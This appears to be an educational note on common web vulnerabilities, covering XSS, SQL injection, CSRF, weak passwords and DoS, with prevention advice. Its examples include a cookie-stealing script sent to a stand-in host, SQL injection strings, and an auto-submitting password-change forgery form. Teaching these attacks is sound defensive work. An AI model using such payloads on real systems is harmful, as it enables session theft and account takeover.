 # Security Vulnerability 
 
 A Security Vulnerability is a weakness, flaw, or error found within a security system that has the potential to be leveraged by a threat agent in order to compromise a secure network.

 There are a number of Security Vulnerabilities. 
 some common examples are as follows: 

 - Broken Authentication
 - SQL Injection
 - Cross-Site Scripting
 - Cross-Site Request Forgery

 ## Cross-Site Scripting (XSS)
 XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

 An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page

 
 ### Types
#### Persistent (Stored) XSS:
    - Persistent XSS attacks are Type 2 XSS attacks because the attack is carried out via two requests:

    - Injecting malicious code and storing it on the web server.
    Loading the stored code and embedding it into the HTML pages that contain the payload.

Example
```
<script> window.location = ‘https://example.com/?user_data=’ + document.cookies; </script>
```
User can add this custom script into comments section. 

When the social network loads this comment, it will include the `script` tag into its HTML. This will automatically redirect the current user to the URL of the malicious website and will send all of the cookies as a query parameter.

#### Reflected XSS
Reflected XSS attacks occur when the data, which is sent from the browser to the server is contained in the servers’ response.

Example:

Suppose that a web app has search functionality. This is how the web app works:

- The user types a search term into an input field.
- The web app redirects the user to a “results” page which has the search term as a query parameter.
- The search term is taken from the query parameter and is being sent to the server for processing.
- When the processing is complete, the response is rendered on the page. The response contains both the search term of the user and the matched results from the server.
- If the user types in “javascript” into the input field, a redirect will happen to the following page:

``` 
https://example.com/search/?term=javascript
```
The web app takes the “javascript” term and sends it to the server. Once the processing is done, the page renders the response:
```
<div> You searched for: javascript </div>
<div> Results: </div>
```

#### Self-XSS
A common approach to Self-XSS attacks is making the victim paste some malicious code into their browser’s console. This gives the attacker access to all of the currently available information from the cookies, DOM, etc.

#### DOM-based XSS
In order for the DOM-based XSS to happen, the JavaScript code of the web app needs to take input from a source that is controllable by the attacker, such as the URL in the browser’s tab.

Example:
```
<script>
    let startPosition = document.URL.indexOf("role=") + 5;
    let userRole = document.URL.substring(startPosition,document.URL.length); 
    document.write(userRole);
</script>
```
The attacker can set the value of the query parameter to a malicious code, which will be injected into the DOM:

```
https://example.com/?role=<script>/*Malicious+code*/</script>
```
### SQL Injection

SQL injection is a code injection technique that might destroy your database.

SQL injection is one of the most common web hacking techniques.

SQL injection is the placement of malicious code in SQL statements, via web page input.

Example 1
```
txtUserId = getRequestString("UserId");
txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
```
In above query user can enter code like `105 OR 1=1`. here `1=1 is Always True` If the `Users` table includes senstive information like username, passwords, personal information. this can be compromised.

Example 2

Api Url
```
https://insecure-website.com/products?category=Gifts
```
SQL query
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--

```
Crucially, note that -- is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

#### Preventions
To protect a web site from SQL injection, you can use SQL parameters.

SQL parameters are values that are added to an SQL query at execution time, in a controlled manner.
Example:
```
txtUserId = getRequestString("UserId");
txtSQL = "SELECT * FROM Users WHERE UserId = @0";
db.Execute(txtSQL,txtUserId);
```

### Cross-site request forgery (CSRF)
Cross-site request forgery (CSRF) is a technique that enables attackers to impersonate a legitimate, trusted user. CSRF attacks can be used to change firewall settings, post malicious data to forums, or conduct fraudulent transactions. In many cases, affected users and website owners are unaware that an attack occurred, and become aware of it only after the damage is done and recovery is not possible.

Example 1:

The original request would look like something like this, transferring the amount to account #344344:

GET http://acmebank.com/fundtransfer?acct=344344&amount=5000 HTTP/1.1

The attacker’s forged request might look like this. The attacker changes the account number to their own account (#224224 in this example) and increases the transfer amount to $50,000:

http://acmebank.com/fundtransfer?acct=224224&amount=50000

Now the attacker needs to trick the victim into visiting this forged URL while signed into the banking application. 
The attacker might draft an email or message with aciton buttons/ links.

Example 2:
Consider a vulnerable application that allows users to change their password via a POST request.
```
<form id="changepass" method="POST" action="http://acmebank.com/password.php">
<input type="text" name="password" value="p@ssw0rD">
<input type="submit" value="Change my password"/>
<form>
```
The attacker can create a copy of this form, changing the password to one known by the attacker (123 in this example):
```
<form id="changepass" method="POST" action="http://acmebank.com/password.php">
    <input type="text" name="password" value="123">
<form>
<script>
    document.getElementById('changepass').submit();
</script>


```
Unlike the original form, the attacker’s version does not have a submit button, and has a script that automatically submits the form as soon as the user loads the HTML.

#### Prevention

Organizations can easily block most CSRF attacks using CSRF tokens. These are unique challenge tokens that can be added to sensitive user requests, such as making a purchase, transferring funds, or creating an admin account on the website backend. Developers can add a CSRF token to every state change request and properly validate these tokens when processing the request, to ensure that the authenticated user sent the request legitimately.

### Weak passwords
Think of a password as your first line of defense against cybercriminals. Simple passwords like “123456” or “password” are an open invitation for hackers. They can crack these using brute-force methods in no time. Strong passwords aren’t just a good practice—they’re a must. A complex mix of letters, numbers, and symbols makes it far harder for attackers to break in.

### Denial of service (DoS)
Denial of Service (DoS) attacks are designed to overwhelm servers and bring them down, making them inaccessible to everyone else. A high-profile example is the 2016 attack on Dyn, which caused major sites like Twitter and Netflix to go offline. To defend against these attacks, companies can use traffic monitoring and tools to filter out malicious requests before they cause a problem.

### Human error

Sometimes, the biggest security risk is simply human error. Whether it’s accidentally sending an email with sensitive information to the wrong person or misconfiguring a security setting, mistakes happen. Training your team regularly on security best practices and putting strong protocols in place can help minimize the chances of a slip-up turning into a data breach.

